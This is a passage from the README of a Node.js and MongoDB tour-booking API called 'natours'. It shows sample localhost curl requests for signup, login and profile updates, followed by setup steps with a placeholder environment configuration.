curl -X POST http://localhost:7000/api/v1/users/signup \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Jane Doe",
    "email": "jane@example.com",
    "password": "Password123!",
    "passwordConfirm": "Password123!"
  }'
```

#### 2. User Login

```bash
curl -X POST http://localhost:7000/api/v1/users/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "jane@example.com",
    "password": "Password123!"
  }'
```

#### 3. Access Protected Route (Bearer Token)

```bash
curl -X GET http://localhost:7000/api/v1/tours \
  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE"
```

#### 4. Update Profile (`updateMe`)

```bash
curl -X PATCH http://localhost:7000/api/v1/users/updateMe \
  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Jane Smith"
  }'
```

---

## 7. Getting Started

### Prerequisites

- [Node.js](https://nodejs.org/) (v14.x or higher)
- [MongoDB Atlas](https://www.mongodb.com/atlas) cluster or local MongoDB instance

### Installation & Setup

1. **Clone the repository:**

   ```bash
   git clone https://github.com/KhezamiTaha/natours.git
   cd natours
   ```

2. **Install project dependencies:**

   ```bash
   npm install
   ```

3. **Configure Environment Variables:**
   Create a `config.env` file in the root directory (based on `.env.example`):

   ```env
   PORT=7000
   NODE_ENV=development
   MONGODB_USERNAME=your_username
   MONGODB_PASSWORD=your_password
   MONGODB_URI="mongodb+srv://your_username:Password@your-cluster.mongodb.net/natours?retryWrites=true"

   JWT_SECRET=your_super_long_and_secure_jwt_secret_key_at_least_32_chars
   JWT_EXPIRES_IN=90d
   JWT_COOKIE_EXPIRES_IN=90d

   GLOBAL_RATE_LIMIT_WINDOW_MS=900000
   GLOBAL_RATE_LIMIT_MAX=100
   RATE_LIMIT_WINDOW_MS=900000
   AUTH_RATE_LIMIT_MAX=10

   PASSWORD_RESET_URL=http://localhost:7000/api/v1/users/resetPassword
   MAILTRAP_HOST=sandbox.smtp.mailtrap.io
   MAILTRAP_PORT=2525
   MAILTRAP_USERNAME=your_mailtrap_username
   MAILTRAP_PASSWORD=your_mailtrap_password
   EMAIL_FROM=noreply@natours.io
   ```

4. **Start the development server:**

   ```bash
   npm start
   ```

   The API server will boot up and listen on `http://localhost:7000`.

5. **Debug mode (Optional):**
   ```bash
   npm run debug
   ```

---

## License

This project is licensed under the **ISC License**.
